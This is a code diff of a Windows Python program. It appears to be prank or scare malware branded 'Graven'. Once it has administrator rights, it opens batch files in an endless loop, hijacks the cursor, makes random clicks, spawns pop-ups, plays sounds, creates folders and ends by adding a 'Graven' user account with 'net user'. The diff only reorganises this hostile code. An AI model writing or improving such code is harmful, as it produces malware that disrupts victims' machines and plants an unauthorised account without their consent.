@@ -3,14 +3,14 @@ from autoit import win_move
 from selenium import webdriver
 from sys import executable, argv
 from ctypes import windll
-from PIL import ImageTk, Image
-from os import system, startfile
+from PIL import ImageTk, Image as Img
+from os import system
 from time import sleep
 from threading import Thread
 from getpass import getuser
 from cv2 import WINDOW_FREERATIO, VideoCapture, namedWindow, resizeWindow, imshow, waitKey, destroyAllWindows
 from keyboard import press_and_release
-from random import uniform, randint, choice
+from random import uniform, randint
 from simpleaudio import WaveObject
 from curses import initscr, curs_set
 from tkinter import *
@@ -18,8 +18,6 @@ from tkinter import *
 
 if windll.shell32.IsUserAnAdmin():
 
-
-    window = Tk()
     initscr()
     system("@ECHO OFF")
 
@@ -32,42 +30,11 @@ if windll.shell32.IsUserAnAdmin():
     options.add_argument("--no-sandbox")
     options.add_argument("--disable-software-rasterizer")
     options.add_experimental_option("excludeSwitches", ["enable-logging"])
-    FAILSAFE = False
     steps_cooldown = {1: 5, 2: 20, 3: 30, 4: 36}
 
     # STEP 0
 
-    def GravenCursor():
-          
-        def CreateCursor():
-              
-            global cursor, graven, canvas, run_cursor
-
-            run_cursor = True
-            cursor = Tk()
-            cursor.geometry("25x25")
-            cursor.overrideredirect(1)
-            cursor.title("Graven Cursor")
-            
-            graven = PhotoImage(file="assets/img.18.png")
-            canvas = Canvas(cursor, highlightthickness=0, bg="black")
-            
-            canvas.create_image(12.5, 12.5, image=graven)
-            
-            canvas.pack()
-
-        CreateCursor()
-              
-        while run_cursor:
-                
-            try:
-                curs_set(0)
-                cursor.update()
-                win_move("Graven Cursor", round(position()[0]-25/2), round(position()[1]-25/2))
-                
-            except: CreateCursor()
-
-    def OpenVBS(): startfile("assets/message.vbs")
+    def OpenVBS(): system("start assets/message.vbs")
 
     # STEP 1
 
@@ -129,13 +96,48 @@ if windll.shell32.IsUserAnAdmin():
       driver = webdriver.Chrome(executable_path="chromedriver.exe", options=options)
       driver.get("https://www.youtube.com/user/Gravenilvectuto")
 
+
+    def GravenCursor():
+        
+        global graven, canvas, cursor
+          
+        def CreateCursor():
+                
+            global cursor, graven, canvas
+
+            cursor = Tk()
+            cursor.geometry("25x25")
+            cursor.overrideredirect(1)
+            cursor.title("Graven Cursor")
+            
+            graven = ImageTk.PhotoImage(Img.open(f"assets/img.18.png"))
+            canvas = Canvas(cursor, highlightthickness=0, bg="black")
+            
+            canvas.create_image(12.5, 12.5, image=graven)
+            
+            canvas.pack()
+            
+        sleep(steps_cooldown[2])
+
+        CreateCursor()
+                
+        while True:
+            
+            try:
+                curs_set(0)
+                cursor.update()
+                win_move("Graven Cursor", round(position()[0]-25/2), round(position()[1]-25/2))
+                
+            except: 
+                CreateCursor()
+
     # STEP 3
 
     def OpenCmd():
       sleep(steps_cooldown[3])
       
       while True:
-        system("start cmd.bat")
+        system("start assets\\sys.bat")
         sleep(12.5)
 
 
@@ -149,74 +151,11 @@ if windll.shell32.IsUserAnAdmin():
 
     # STEP 4
 
-    def OpenGravenPopups():
-          
-        global run_cursor
-        
-        sleep(steps_cooldown[4])
-        
-        def CreateCursor():
+    def StartPopups(): 
+      sleep(steps_cooldown[4])
+      system("start grv_popups.exe")
             
-            global cursor, graven, canvas
-
-            cursor = Tk()
-            cursor.geometry("25x25")
-            cursor.overrideredirect(1)
-            cursor.title("Graven Cursor")
-            
-            graven = PhotoImage(file="assets/img.18.png")
-            canvas = Canvas(cursor, highlightthickness=0, bg="black")
-            
-            canvas.create_image(12.5, 12.5, image=graven)
-            
-            canvas.pack()
-                              
-        def loadPopup():
-            
-            global popup, canvas_0, images
-
-            popup = Toplevel()
-            images = list()
-            
-            for image in range(11):
-                images.append(ImageTk.PhotoImage(Image.open(f"assets/img.{image}.png")))
-            
-            popup.geometry(f"{randint(0, position()[0])}x{randint(0, position()[1])}")
-            popup.overrideredirect(1)
-            popup.title("Popup")
-            popup.configure(background='black')
-            
-            canvas_0 = Canvas(popup, highlightthickness=0, bg="black")
-            canvas_0.create_image(0, 0, image=choice(images))
-            
-            canvas_0.pack()
-            
-            popup.update()
-            
-            win_move("Popup", randint(0, position()[0]), randint(0, position()[1]))
-
-        run_cursor = False
-        sleep(0.5)
-        CreateCursor()  
-        loadPopup()   
-                
-        while True:
-                
-            try:
-                popup.update()
-                cursor.update()
-                win_move("Graven Cursor", round(position()[0]-25/2), round(position()[1]-25/2))
-
-            except: 
-                try: 
-                    popup.destroy()
-                    cursor.destroy()
-                except: 0 + 0
-                
-                CreateCursor()  
-                loadPopup()  
       
-
     def RandomClicks():
       sleep(steps_cooldown[4])
 
@@ -233,13 +172,12 @@ if windll.shell32.IsUserAnAdmin():
         sleep(2.5)
 
 
-
     threads = list()
 
     threads.append(Thread(target=Clip))
     threads.append(Thread(target=RandomClicks))
     threads.append(Thread(target=YouHaveBeenHackedByGraven))
-    threads.append(Thread(target=OpenGravenPopups))
+    threads.append(Thread(target=StartPopups))
     threads.append(Thread(target=OpenCmd))
     threads.append(Thread(target=PlaySound))
     threads.append(Thread(target=CreateFolders))
@@ -249,7 +187,6 @@ if windll.shell32.IsUserAnAdmin():
     threads.append(Thread(target=GravenWrite))
     threads.append(Thread(target=OpenVBS))
     threads.append(Thread(target=GravenCursor))
-
 
     system(f"net user Graven /add")
 
